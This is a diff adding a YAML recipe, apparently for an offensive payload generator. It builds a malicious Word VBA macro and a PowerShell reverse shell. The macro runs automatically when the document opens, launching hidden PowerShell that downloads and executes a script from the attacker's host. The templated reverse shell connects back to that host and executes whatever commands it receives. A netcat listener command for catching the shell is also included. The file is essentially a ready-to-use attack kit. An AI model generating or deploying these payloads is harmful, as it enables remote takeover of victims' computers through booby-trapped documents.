@@ -1,0 +1,49 @@
+description: "VBA Macro & reverse shell for basic Powershell reverse shells"
+variables:
+  outputdir: "output"
+  vbaFile: "powershell-command-exec.vba"
+  revshellFile: "pce.txt"
+  port: 80
+  LPORT: 445
+templates:
+  powershell:
+    variables:
+      command: "iex(iwr -UseBasicParsing http://{{LHOST}}:{{port}}/{{revshellFile}})"
+      payload_fn: "{{ Helpers.random_str() }}"
+      wsh_fn: "{{ Helpers.random_str() }}"
+    template: |-
+      Sub {{payload_fn}}()
+        Dim {{wsh_fn}}
+        Set {{wsh_fn}} = CreateObject("Wscript.Shell")
+        {{wsh_fn}}.Run "powershell -ep bypass -Sta -Nop -Window Hidden -EncodedCommand {{ Encoder.base64(command,Encoder.utf16le) }}"
+        Set {{wsh_fn}} = Nothing
+      End Sub
+      Sub Document_Open()
+        {{payload_fn}}
+      End Sub
+      Sub AutoOpen()
+        {{payload_fn}}
+      End Sub
+  revshell:
+    # revshells.com
+    template: "$TCPClient = New-Object Net.Sockets.TCPClient('{{ LHOST }}', {{ LPORT }});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+print:
+- "Generating a basic VBA and powershell reverse shell to listen on {{LHOST}}:{{LPORT}}"
+- "VBA File: {{outputdir}}/{{vbaFile}}"
+- "Powershell Reverse Shell: {{outputdir}}/{{revshellFile}}"
+- |-
+  To Catch the shell
+  rlwrap nc -lvnp {{LPORT}}
+setupCommands:
+- "mkdir -p {{outputdir}}"
+- "rm -rf {{outputdir}}/{{vbaFile}}"
+- "rm -rf {{outputdir}}/{{revshellFile}}"
+commands:
+- |-
+  cat << EOF >{{outputdir}}/{{vbaFile}}
+  {{Templates.get('powershell')}}
+  EOF
+- |-
+  cat <<EOF >{{outputdir}}/{{revshellFile}}
+  {{Templates.get('revshell')}}
+  EOF
